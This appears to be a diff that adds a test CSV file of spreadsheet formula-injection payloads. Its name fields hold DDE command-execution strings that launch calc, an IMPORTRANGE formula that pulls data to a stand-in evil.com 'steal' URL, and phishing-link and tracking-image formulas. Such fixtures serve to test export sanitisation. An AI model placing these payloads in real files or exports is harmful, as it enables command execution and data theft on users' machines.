@@ -1,0 +1,10 @@
+name,email
+=CMD|' /C calc'!A0,formula1@evil.com
+@SUM(1+1)*cmd|' /C calc'!A0,formula2@evil.com
++SUMPRODUCT(1,cmd|'/C calc'!A0),formula3@evil.com
+-1+cmd|'/C calc'!A0,formula4@evil.com
+=IMPORTRANGE('https://evil.com/steal','Sheet1!A1:Z999'),formula5@evil.com
+=HYPERLINK("https://evil.com/phish","Click Me"),formula6@evil.com
+=IMAGE("https://evil.com/track.png"),formula7@evil.com
+|calc.exe,formula8@evil.com
+DDE("cmd";"calc";"__"),formula9@evil.com
